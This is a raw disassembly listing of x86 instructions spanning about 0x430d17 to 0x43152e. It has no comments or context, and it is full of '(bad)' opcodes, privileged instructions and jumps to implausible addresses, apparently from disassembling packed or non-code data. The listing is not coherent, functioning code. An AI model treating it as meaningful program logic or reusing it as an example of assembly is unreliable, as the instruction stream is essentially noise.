  430d17:	push   esi
  430d18:	clc    
  430d19:	jne    0x430ceb
  430d1b:	mov    ecx,0xf8450b0b
  430d20:	(bad)  
  430d21:	push   cs
  430d22:	or     BYTE PTR [ebp-0x3a],dh
  430d25:	cmp    eax,DWORD PTR [ecx]
  430d27:	pop    esi
  430d28:	(bad)  
  430d29:	or     al,0x5
  430d2b:	inc    eax
  430d2c:	leave  
  430d2d:	jmp    0x40cf:0x25564204
  430d34:	leave  
  430d35:	in     eax,dx
  430d36:	inc    DWORD PTR [eax-0x75]
  430d39:	fimul  DWORD PTR [ebx-0x228139be]
  430d3f:	inc    eax
  430d40:	nop
  430d41:	loopne 0x430d42
  430d43:	ret    
  430d44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d4a:	add    eax,0xff45e8f8
  430d4f:	push   esi
  430d50:	push   DWORD PTR [ebp-0x39]
  430d53:	mov    eax,0x7edda46
  430d58:	or     al,0x6
  430d5a:	push   DWORD PTR [ebp-0x3a]
  430d5d:	cmp    eax,DWORD PTR [edx]
  430d5f:	pop    esi
  430d60:	ret    
  430d61:	or     al,0x56
  430d63:	inc    ecx
  430d64:	push   ebp
  430d65:	jle    0x430d53
  430d67:	inc    edx
  430d68:	inc    ebp
  430d69:	int    0x1
  430d6b:	inc    ecx
  430d6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430d72:	add    DWORD PTR [edx+0x1c],eax
  430d75:	retf   0xc38b
  430d78:	adc    al,0x8b
  430d7a:	xchg   edx,eax
  430d7b:	push   ecx
  430d7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d82:	rcl    DWORD PTR [esi-0x9],cl
  430d85:	jne    0x430dd7
  430d87:	mov    eax,0x7c80ece
  430d8c:	rol    DWORD PTR [esi],cl
  430d8e:	div    DWORD PTR [ebp+0x50]
  430d91:	cmp    ecx,edx
  430d93:	pop    esi
  430d94:	dec    BYTE PTR [edx]
  430d96:	in     al,dx
  430d97:	inc    edx
  430d98:	sub    esp,ecx
  430d9a:	inc    eax
  430d9b:	(bad)  
  430d9c:	push   eax
  430d9d:	add    edx,DWORD PTR [eax-0x1f]
  430da0:	push   edi
  430da1:	add    dh,dh
  430da3:	leave  
  430da4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430da8:	add    BYTE PTR [ecx+0x0],dl
  430dab:	inc    ebp
  430dac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430db2:	add    BYTE PTR [eax-0x7fbf448],bh
  430db8:	add    al,0x2
  430dba:	jmp    0x57eb914
  430dbf:	jne    0x430da9
  430dc1:	mov    eax,DWORD PTR [edx]
  430dc3:	or     BYTE PTR [eax],al
  430dc5:	inc    ecx
  430dc6:	stc    
  430dc7:	in     eax,dx
  430dc8:	ss inc eax
  430dca:	aas    
  430dcb:	out    0x7d,eax
  430dcd:	inc    ecx
  430dce:	mov    ebp,ecx
  430dd0:	lock ret 0x7d
  430dd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430dda:	add    bh,bh
  430ddc:	aad    0xd7
  430dde:	add    dh,cl
  430de0:	clts   
  430de2:	(bad)  
  430de3:	call   0xffce0ce8
  430de8:	hlt    
  430de9:	iret   
  430dea:	jge    0x430dc2
  430dec:	rol    DWORD PTR [esi-0x80],cl
  430def:	jmp    0x1c5cfc
  430df4:	out    dx,al
  430df5:	mov    eax,DWORD PTR [ebx]
  430df7:	(bad)  
  430df8:	pop    esi
  430df9:	push   es
  430dfa:	cmp    al,0xe8
  430dfc:	sar    edi,0x8
  430dff:	inc    DWORD PTR [edi]
  430e01:	inc    esi
  430e02:	(bad)  
  430e03:	loopne 0x430e83
  430e05:	push   edi
  430e06:	push   cs
  430e07:	push   ebx
  430e08:	add    BYTE PTR [ebx+0x24008b56],cl
  430e0e:	add    BYTE PTR [ebp+0x50],al
  430e11:	push   eax
  430e12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e18:	sub    edx,DWORD PTR [esi-0x24]
  430e1b:	jne    0x430dd3
  430e1d:	lods   eax,DWORD PTR ds:[esi]
  430e1e:	mov    edx,DWORD PTR [edx-0x34]
  430e21:	dec    esi
  430e22:	out    0x83,eax
  430e24:	into   
  430e25:	push   edi
  430e27:	loopne 0x430df7
  430e29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e34:	rol    DWORD PTR [edx],0x8
  430e37:	mov    esp,ecx
  430e39:	cmp    DWORD PTR [ebx],0xc
  430e3c:	mov    esi,0x5001c0
  430e41:	push   eax
  430e42:	push   cs
  430e43:	push   eax
  430e44:	(bad)  
  430e45:	sub    edx,edi
  430e47:	push   esi
  430e48:	adc    al,0xcb
  430e4a:	ins    DWORD PTR es:[edi],dx
  430e4b:	mov    eax,0x203e8
  430e50:	add    al,ah
  430e52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e59:	add    dh,al
  430e5b:	add    ah,ch
  430e5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e63:	pop    ecx
  430e64:	or     eax,ebx
  430e66:	cli    
  430e67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e6d:	lea    ebp,[ebx]
  430e6f:	mov    edx,DWORD PTR [edx-0x4]
  430e72:	dec    ecx
  430e73:	inc    ebp
  430e74:	shr    BYTE PTR [ebx],0x4b
  430e77:	and    al,0x0
  430e79:	(bad)  
  430e7a:	jne    0x430ec1
  430e7c:	pop    eax
  430e7d:	mov    al,0x5a
  430e7f:	call   0x14210de
  430e84:	and    al,0x85
  430e86:	push   edx
  430e87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e8b:	dec    ebp
  430e8c:	mov    cl,0x23
  430e8e:	jmp    0x430e7c
  430e90:	mov    al,0xe7
  430e92:	call   0x1391180
  430e97:	shr    DWORD PTR [eax+ebx*2],cl
  430e9a:	lock (bad) 
  430e9c:	adc    eax,0x757f008d
  430ea1:	out    0x58,eax
  430ea3:	cmp    al,0x7
  430ea5:	pop    edx
  430ea6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ead:	push   ecx
  430eae:	cld    
  430eaf:	mov    esi,0x3b0175
  430eb4:	and    al,0xb0
  430eb6:	xor    BYTE PTR [edx+0x1],0x8b
  430eba:	add    ah,bh
  430ebc:	mov    edi,DWORD PTR [ebp-0x4]
  430ebf:	psubsw mm7,QWORD PTR [edi]
  430ec2:	add    DWORD PTR [ebp+0x0],ebp
  430ec5:	rcr    eax,1
  430ec7:	mov    edi,ecx
  430ec9:	and    eax,DWORD PTR [eax]
  430ecb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ed1:	call   0x13011ba
  430ed6:	add    al,cl
  430ed8:	mov    ebp,esi
  430eda:	aam    0x83
  430edc:	or     DWORD PTR [ecx],eax
  430ede:	jne    0x430ed1
  430ee0:	mov    eax,DWORD PTR [eax]
  430ee2:	aam    0x0
  430ee4:	dec    ebp
  430ee5:	jne    0x430e72
  430ee7:	cmp    ebx,eax
  430ee9:	jb     0x430f38
  430eeb:	jmp    0x430e78
  430eed:	mov    ebx,esp
  430eef:	int3   
  430ef0:	dec    ebp
  430ef1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430ef8:	mov    edx,0x8b0a8b
  430efd:	cmp    ecx,DWORD PTR [eax]
  430eff:	jb     0x430ed8
  430f01:	pop    edx
  430f02:	push   edi
  430f03:	cli    
  430f04:	pop    es
  430f05:	mov    eax,ecx
  430f07:	jb     0x430f0b
  430f09:	add    DWORD PTR [ebx],0xa
  430f0c:	mov    eax,DWORD PTR [ebx]
  430f0e:	int3   
  430f0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f15:	jmp    0x430ea2
  430f17:	mov    al,0xe8
  430f19:	call   0x104119b
  430f1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430f21:	pop    edi
  430f22:	or     BYTE PTR [ecx-0x73],bl
  430f25:	pop    ecx
  430f26:	inc    edi
  430f27:	xor    al,0xeb
  430f29:	push   ecx
  430f2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f30:	call   0xb21035
  430f35:	int3   
  430f36:	sbb    BYTE PTR [esi],ch
  430f38:	inc    ebp
  430f39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f3f:	call   0x9c11ae
  430f44:	or     BYTE PTR [ebx-0x73],dl
  430f47:	cmp    al,0x47
  430f49:	mov    al,0x1
  430f4b:	jb     0x430f4d
  430f4d:	mov    al,0x10
  430f4f:	push   eax
  430f50:	add    al,0x75
  430f52:	add    BYTE PTR [ebx],ch
  430f54:	add    ebx,esp
  430f56:	int3   
  430f57:	jne    0x430f69
  430f59:	movsx  edx,cl
  430f5c:	add    DWORD PTR [eax],eax
  430f5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f65:	mov    gs,edi
  430f67:	add    BYTE PTR [eax-0x50],ch
  430f6a:	add    al,ch
  430f6c:	mov    eax,DWORD PTR [ecx]
  430f6e:	sub    eax,DWORD PTR [eax]
  430f70:	jb     0x430fe7
  430f72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f76:	jge    0x430f60
  430f78:	add    al,0x1
  430f7a:	add    DWORD PTR [eax],0x0
  430f7d:	jne    0x430f7f
  430f7f:	je     0x430fc6
  430f81:	mov    eax,DWORD PTR [edi]
  430f83:	ror    BYTE PTR [ebp+0x4d],1
  430f86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f93:	mov    DWORD PTR [ebx],ebp
  430f95:	fadd   DWORD PTR [eax+0x75]
  430f98:	inc    eax
  430f99:	pop    eax
  430f9a:	lea    ebx,[ecx+0x4f]
  430f9d:	push   0xb1000003
  430fa2:	out    dx,eax
  430fa3:	add    ebp,DWORD PTR [edx+edx*2]
  430fa6:	add    BYTE PTR [ebx+ecx*4],bh
  430fa9:	mov    ch,BYTE PTR [ebx]
  430fab:	jb     0x43101f
  430fad:	add    al,0x89
  430faf:	push   eax
  430fb0:	call   0x842b5d22
  430fb5:	add    DWORD PTR [eax+eax*1],eax
  430fb8:	jae    0x430fce
  430fba:	icebp  
  430fbb:	inc    ebp
  430fbc:	mov    eax,DWORD PTR gs:[ecx]
  430fbf:	int3   
  430fc0:	out    dx,al
  430fc1:	loopne 0x431010
  430fc3:	sub    eax,DWORD PTR [edx]
  430fc5:	push   0xffffff83
  430fc7:	pop    esi
  430fc8:	push   cs
  430fc9:	jl     0x430fe4
  430fcb:	add    al,0xaf
  430fcd:	xor    eax,0x832b6d00
  430fd2:	mov    eax,DWORD PTR [edx]
  430fd4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430fe0:	inc    ebp
  430fe1:	shr    ebx,0x3
  430fe4:	or     DWORD PTR [eax],0x4
  430fe7:	push   0xffffffa5
  430fe9:	pop    esi
  430fea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ff1:	jmp    0x431050
  430ff3:	mov    edi,0xff0272
  430ff8:	fdivr  QWORD PTR [ebp+0x5d]
  430ffb:	push   0x4e
  430ffd:	pop    ecx
  430ffe:	call   0x435403
  431003:	mov    DWORD PTR [ebx],eax
  431005:	in     al,0xc8
  431007:	rol    BYTE PTR [ebp-0x75],0xc1
  43100b:	call   0xad11ec
  431010:	pop    esi
  431011:	enter  0xceff,0x8b
  431015:	repz mov ecx,DWORD PTR [ebp-0x34]
  431019:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431020:	je     0x431022
  431022:	or     DWORD PTR [ebx-0x74183b24],eax
  431028:	jne    0x43100e
  43102a:	jmp    0x431025
  43102c:	push   DWORD PTR [edx-0x24]
  43102f:	push   0x4d
  431031:	pop    ecx
  431032:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431036:	jge    0x43103e
  431038:	mov    eax,eax
  43103a:	sub    ebp,DWORD PTR [edx+0x24]
  43103d:	pop    esi
  43103e:	inc    ebp
  43103f:	mov    esp,0x8b6077
  431044:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43104a:	lods   al,BYTE PTR ds:[esi]
  43104b:	add    BYTE PTR [ebx],bh
  43104d:	enter  0xce73,0x49
  431051:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431059:	stc    
  43105a:	jge    0x4310ce
  43105c:	jnp    0xdd4293cb
  431062:	call   0xc61138
  431067:	fadd   st(0),st
  431069:	dec    esi
  43106a:	ins    BYTE PTR es:[edi],dx
  43106b:	stc    
  43106c:	cmp    al,0x73
  43106e:	push   ebp
  43106f:	mov    eax,0xf8028b
  431074:	jne    0x431037
  431076:	mov    esi,ecx
  431078:	mov    esp,DWORD PTR [ebp+0x2c]
  43107b:	add    edi,DWORD PTR [ebp-0x24]
  43107e:	sub    esp,eax
  431080:	and    al,0x45
  431082:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431088:	sbb    al,0xee
  43108a:	pop    esi
  43108b:	call   0x8310bb
  431090:	fsubr  st,st(3)
  431092:	sti    
  431093:	add    BYTE PTR gs:[ecx],bh
  431096:	add    eax,esp
  431098:	add    DWORD PTR [esi],eax
  43109a:	rol    DWORD PTR [ebp+0x8],0x29
  43109e:	mov    esp,eax
  4310a0:	clc    
  4310a1:	jne    0x431118
  4310a3:	mov    eax,0x8b0673
  4310a8:	loopne 0x4310ef
  4310aa:	loopne 0x431035
  4310ac:	lods   al,BYTE PTR ds:[esi]
  4310ad:	int3   
  4310ae:	inc    ebp
  4310af:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310b3:	add    al,0xc3
  4310b5:	sub    ecx,DWORD PTR [ebp+0x47]
  4310b8:	(bad)  
  4310ba:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310be:	add    eax,DWORD PTR [eax]
  4310c0:	call   0x644d1c5
  4310c5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310cb:	dec    esi
  4310cc:	ins    DWORD PTR es:[edi],dx
  4310cd:	in     al,dx
  4310ce:	lea    eax,[eax]
  4310d0:	inc    ebp
  4310d1:	inc    ebp
  4310d2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310d8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310e2:	and    al,0xdc
  4310e4:	ror    DWORD PTR [edx+0x24],0xf7
  4310e8:	or     BYTE PTR [ebp+0x4c],dh
  4310eb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4310ef:	stos   BYTE PTR es:[edi],al
  4310f0:	adc    edx,edi
  4310f2:	inc    esp
  4310f3:	add    edi,DWORD PTR [eax]
  4310f5:	jne    0x4310da
  4310f7:	mov    DWORD PTR [eax-0x7449db04],ecx
  4310fd:	cmp    ecx,DWORD PTR [edi]
  4310ff:	sub    BYTE PTR [ebp-0x7e],dl
  431102:	sar    ebp,0xb
  431105:	jmp    FWORD PTR [edi+0x2400392a]
  43110b:	sub    esi,DWORD PTR [ebx-0x73]
  43110e:	mov    esp,DWORD PTR [ecx+edi*4]
  431111:	mov    ecx,DWORD PTR [eax]
  431113:	and    BYTE PTR [eax],al
  431115:	jne    0x4310e1
  431117:	sub    ebp,ecx
  431119:	sbb    BYTE PTR [esi+0x32],ah
  43111c:	dec    ebp
  43111d:	push   ebp
  43111e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431124:	ret    
  431125:	mov    edx,ebp
  431127:	leave  
  431128:	sub    DWORD PTR [esi+0x24],ebx
  43112b:	ret    0x2b
  43112e:	pop    ax
  431130:	push   ebp
  431131:	rol    BYTE PTR [ebx],0xeb
  431134:	add    DWORD PTR [ecx+0x6c0001],0x40
  43113b:	jb     0x431192
  43113d:	ret    
  43113e:	in     al,dx
  43113f:	jecxz  0x4310cc
  431141:	push   esi
  431142:	xchg   esp,eax
  431143:	jne    0x431145
  431145:	cmp    edx,DWORD PTR [esi+0x1c]
  431148:	jne    0x43112e
  43114a:	mov    eax,DWORD PTR [ebp-0x77]
  43114d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431154:	mov    esi,DWORD PTR [ebp-0x75]
  431157:	pop    esi
  431158:	nop
  431159:	mov    eax,DWORD PTR [eax]
  43115b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431161:	add    al,0x0
  431163:	inc    ebp
  431164:	mov    eax,DWORD PTR [ebx]
  431166:	mov    ebp,ebx
  431168:	cmp    al,0xf
  43116a:	or     al,al
  43116c:	inc    ebp
  43116d:	inc    ebp
  43116e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431174:	cld    
  431175:	add    BYTE PTR [edi+0x546c16c0],dh
  43117b:	add    BYTE PTR [ecx-0x5],dl
  43117e:	add    eax,0x17200
  431183:	sbb    al,0x85
  431185:	dec    esp
  431186:	je     0x4311c0
  431188:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43118c:	add    BYTE PTR [ebx],bh
  43118e:	(bad)  
  43118f:	and    al,0x32
  431191:	jae    0x43112f
  431193:	mov    cl,cl
  431195:	inc    DWORD PTR [esp]
  431198:	push   ebp
  431199:	shr    esp,0x8
  43119c:	in     al,dx
  43119d:	push   esp
  43119e:	add    DWORD PTR [eax],esp
  4311a0:	add    bl,cl
  4311a2:	inc    ebp
  4311a3:	mov    bh,0x89
  4311a5:	add    ah,bh
  4311a7:	jmp    0xca7520f1
  4311ac:	pushf  
  4311ad:	dec    esp
  4311ae:	mov    edx,0xf8178520
  4311b3:	fst    DWORD PTR [ebp+0x0]
  4311b6:	mov    BYTE PTR [eax],0xc4
  4311b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4311bc:	inc    ebp
  4311bd:	add    eax,0xc601da
  4311c2:	mov    al,0xc6
  4311c5:	ins    BYTE PTR es:[edi],dx
  4311c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311cd:	dec    esp
  4311ce:	jmp    DWORD PTR [eax]
  4311d0:	inc    ebp
  4311d1:	fnstcw WORD PTR [esi+0x29]
  4311d4:	test   BYTE PTR [eax],0xc8
  4311d7:	rol    BYTE PTR [eax],0xc0
  4311da:	lea    ecx,[ebp-0x3cf0dbcb]
  4311e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311e6:	inc    esi
  4311e7:	add    DWORD PTR [eax],ebx
  4311e9:	add    dh,bh
  4311eb:	mov    esi,DWORD PTR [edx+0x8]
  4311ee:	(bad)  
  4311ef:	fdiv   QWORD PTR ss:[ecx]
  4311f2:	(bad)  
  4311f3:	mov    bl,ch
  4311f5:	add    esi,eax
  4311f7:	add    dh,bl
  4311f9:	or     esi,eax
  4311fb:	mov    dl,0xdf
  4311fd:	add    esi,eax
  4311ff:	add    al,ah
  431201:	push   cs
  431202:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431209:	or     BYTE PTR [ebx],dh
  43120b:	dec    ecx
  43120c:	lea    eax,[ebx]
  43120e:	xor    eax,0x18fc0fc7
  431213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431214:	repz clc 
  431216:	add    eax,DWORD PTR [ebp+0x46]
  431219:	prefetcht0 BYTE PTR [ecx-0x2]
  43121d:	xor    eax,0x7c60872
  431222:	mov    esp,0xbd32c69b
  431227:	pop    esi
  431228:	mov    cl,0xbe
  43122b:	or     al,0xc6
  43122d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431234:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43123b:	add    dh,al
  43123d:	mov    eax,ebx
  43123f:	xor    DWORD PTR [ebx],0x35008dbc
  431245:	mov    ecx,DWORD PTR [edi]
  431247:	sbb    al,0x18
  431249:	inc    ebp
  43124a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431251:	clc    
  431252:	(bad)  
  431253:	xor    DWORD PTR [edx-0x64],esi
  431256:	lea    ecx,[ecx+0x45ffe838]
  43125c:	mov    ecx,ebx
  43125e:	fadd   st,st(6)
  431260:	dec    ebp
  431261:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431267:	out    0x1,eax
  431269:	inc    ebp
  43126a:	lea    ebp,ds:0xc8ffc6ff
  431270:	enter  0xa33,0xc6
  431274:	push   ebp
  431275:	leave  
  431276:	(bad)  
  431277:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43127d:	add    BYTE PTR [ebp+0x44],al
  431280:	mov    eax,esp
  431282:	mov    WORD PTR [esi+0x46398300],?
  431288:	psubusw mm4,QWORD PTR [esi-0x78]
  43128c:	add    BYTE PTR [ebx-0x1303f975],al
  431292:	add    BYTE PTR [ebp+0x1],0xeb
  431296:	add    BYTE PTR [ebp+0x38],al
  431299:	in     eax,dx
  43129a:	inc    ebp
  43129b:	inc    ebp
  43129c:	mov    ebx,ebx
  43129e:	add    BYTE PTR [ebp+0x0],0xec
  4312a2:	mov    DWORD PTR [ebp-0x41],eax
  4312a5:	sub    eax,0x2c00454e
  4312aa:	ins    DWORD PTR es:[edi],dx
  4312ab:	inc    ebp
  4312ac:	add    BYTE PTR [esi+0x66],bh
  4312af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312c0:	dec    edi
  4312c1:	pop    es
  4312c2:	add    ah,ch
  4312c4:	mov    DWORD PTR [ebp+0x68],eax
  4312c7:	in     eax,dx
  4312c8:	inc    DWORD PTR [ebp-0x7d]
  4312cb:	out    0xc0,al
  4312cd:	inc    ebp
  4312ce:	mov    edx,esp
  4312d0:	push   0x45
  4312d2:	(bad)  
  4312d3:	jmp    0xdf925890
  4312d8:	add    BYTE PTR [ebp-0x77],al
  4312db:	out    dx,al
  4312dc:	ins    BYTE PTR es:[edi],dx
  4312dd:	inc    ebp
  4312de:	jmp    edi
  4312e0:	add    DWORD PTR [ebp-0x14],0x7e
  4312e4:	mov    esi,esi
  4312e6:	outs   dx,BYTE PTR ds:[esi]
  4312e7:	inc    esp
  4312e8:	(bad)  
  4312e9:	mov    esp,0x8341b68d
  4312ee:	mov    DWORD PTR [esi+0x70],eax
  4312f1:	fcos   
  4312f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4312f9:	in     al,dx
  4312fa:	jb     0x431281
  4312fc:	(bad)  
  4312fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431303:	mov    edi,edi
  431305:	fdivr  st,st(7)
  431307:	out    dx,eax
  431308:	rcl    BYTE PTR [ebx],0x66
  43130b:	mov    DWORD PTR [ebp-0xc70075],eax
  431311:	(bad)  
  431312:	std    
  431313:	cmp    eax,DWORD PTR [eax]
  431315:	jne    0x43137d
  431317:	mov    DWORD PTR [ebp-0xba0048],eax
  43131d:	in     al,dx
  43131e:	outs   dx,BYTE PTR ds:[esi]
  43131f:	pushf  
  431320:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431326:	inc    DWORD PTR [ecx]
  431328:	inc    DWORD PTR [eax]
  43132a:	jae    0x431364
  43132c:	add    BYTE PTR [ebp+0x850266],al
  431332:	inc    DWORD PTR [ebp-0x1]
  431335:	mov    eax,eax
  431337:	jl     0x43139f
  431339:	add    BYTE PTR [ebp-0x740077],al
  43133f:	cld    
  431340:	dec    eax
  431341:	add    BYTE PTR [eax],0x1
  431344:	data16 add BYTE PTR [ebp+0x38],al
  431348:	mov    eax,0x47c2
  43134d:	mov    eax,0x824f89
  431352:	inc    edi
  431353:	mov    DWORD PTR [edx+0x64],ebp
  431356:	inc    WORD PTR [ebp-0x75]
  43135a:	(bad)  
  43135b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431362:	inc    ebp
  431363:	jge    0x431344
  431365:	add    bh,ah
  431367:	lea    ax,[ebp-0x750030]
  43136e:	add    al,0x46
  431371:	jmp    0x40ff:0x8885
  431377:	push   DWORD PTR [ebp+0x52]
  43137a:	lea    eax,[eax]
  43137c:	shl    BYTE PTR [esi-0x7b],1
  43137f:	test   esi,edi
  431381:	(bad)  
  431382:	(bad)  
  431383:	inc    DWORD PTR [ebp-0x990140]
  431389:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43138f:	inc    edi
  431390:	push   ecx
  431391:	xor    ax,WORD PTR [ebp-0x8d0045]
  431398:	add    al,al
  43139a:	ret    
  43139b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313a2:	push   eax
  4313a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313aa:	add    BYTE PTR [ebx-0x764f8839],al
  4313b0:	push   DWORD PTR [esi+0x1]
  4313b3:	inc    DWORD PTR [eax]
  4313b5:	mov    eax,0xff99ff
  4313ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313c0:	jne    0x43137a
  4313c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313cc:	mov    ecx,0xd74fb8
  4313d1:	add    cl,al
  4313d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313e0:	(bad)  
  4313e1:	push   ebp
  4313e3:	mov    eax,0x8c2789
  4313e8:	ret    0x6689
  4313eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4313ef:	add    bh,ah
  4313f1:	mov    WORD PTR [ebp-0x70],ax
  4313f5:	(bad)  
  4313f6:	ret    0x667d
  4313f9:	or     BYTE PTR [ebp-0x77],dl
  4313fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431403:	loop   0x43138e
  431405:	(bad)  
  431406:	xchg   esi,eax
  431407:	aam    0xcf
  431409:	out    dx,al
  43140a:	mov    DWORD PTR [esi-0x68],edi
  43140d:	inc    ebp
  43140e:	dec    edx
  43140f:	pop    ecx
  431410:	mov    edx,DWORD PTR [eax]
  431412:	repnz push bp
  431415:	or     BYTE PTR [ebx+0x55106638],0x49
  43141c:	(bad)  
  43141d:	repnz xor eax,0xa0898945
  431423:	mov    ah,0x89
  431425:	jmp    DWORD PTR [edx+0x66b0418d]
  43142b:	inc    DWORD PTR [ebp+0x50]
  43142e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431432:	mov    DWORD PTR [eax],ecx
  431434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431435:	pop    es
  431436:	inc    ecx
  431437:	(bad)  
  431438:	data16 fwait
  43143a:	inc    ebp
  43143b:	xor    ah,BYTE PTR [esi+0x3]
  43143e:	dec    ebp
  43143f:	push   eax
  431440:	inc    bp
  431442:	jge    0x4313c7
  431444:	mov    esp,DWORD PTR [esi-0x18]
  431447:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43144d:	add    DWORD PTR [ebx],esi
  43144f:	add    BYTE PTR [ebx],al
  431451:	test   DWORD PTR [ebx],esi
  431453:	(bad)  
  431454:	inc    WORD PTR [ebp+0x0]
  431458:	mov    eax,DWORD PTR [eax]
  43145a:	call   0x8898cb8f
  43145f:	mov    esi,eax
  431461:	clc    
  431462:	ret    
  431463:	rol    cl,0xa
  431466:	mov    DWORD PTR ds:0x7c0ec88,esi
  43146c:	mov    edx,edi
  43146e:	pushf  
  43146f:	pop    es
  431470:	jmp    FWORD PTR [edx+0x66]
  431473:	add    BYTE PTR [ebp-0x990175],al
  431479:	inc    ebp
  43147a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431480:	push   ebp
  431481:	mov    edi,eax
  431483:	mov    dh,BYTE PTR [eax+0x266ff51]
  431489:	push   ebp
  43148a:	add    BYTE PTR [ebx-0x764b0777],al
  431490:	dec    DWORD PTR [esi+0x661851e8]
  431496:	add    BYTE PTR [ebp-0x7b],dl
  431499:	cmp    esi,0xfffffffb
  43149c:	dec    DWORD PTR [ecx+0x51fe9285]
  4314a2:	jmp    DWORD PTR [esi-0x75]
  4314a5:	push   ebp
  4314a6:	hlt    
  4314a7:	data16 (bad) 
  4314a9:	dec    ebp
  4314aa:	ret    
  4314ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314b1:	lea    edx,[eax-0x1]
  4314b4:	jne    0x431487
  4314b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314bc:	dec    BYTE PTR [ecx+0x51559eff]
  4314c2:	mov    DWORD PTR [esi-0x4c],esp
  4314c5:	push   ebp
  4314c6:	jmp    DWORD PTR [esi-0x18]
  4314c9:	inc    ebp
  4314ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314d0:	(bad)  
  4314d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314d2:	inc    eax
  4314d4:	test   DWORD PTR [esi-0x2],esp
  4314d7:	inc    ebp
  4314d8:	dec    DWORD PTR [ebp-0x760bde75]
  4314de:	(bad)  
  4314df:	test   al,0xc3
  4314e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314e7:	lods   al,BYTE PTR ds:[esi]
  4314e8:	push   eax
  4314e9:	inc    ebp
  4314ea:	jne    0x4314fb
  4314ec:	dec    DWORD PTR [ebp+0x8]
  4314ef:	mov    ecx,DWORD PTR [ebx]
  4314f1:	sbb    al,0x0
  4314f3:	(bad)  
  4314f4:	mov    eax,0xc14fc3
  4314f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4314ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431503:	xor    eax,DWORD PTR [eax]
  431505:	add    eax,edi
  431507:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43150d:	xor    edi,DWORD PTR [eax+0x854f66]
  431513:	dec    BYTE PTR [ecx-0x76bb01]
  431519:	mov    BYTE PTR [ebx-0x76724001],al
  43151f:	pushf  
  431520:	inc    esi
  431521:	(bad)  
  431522:	dec    DWORD PTR [ebp-0x7abe6373]
  431528:	sar    esi,0x89
  43152b:	dec    DWORD PTR [eax+0x0]
  43152e:	inc    DWORD PTR [eax]
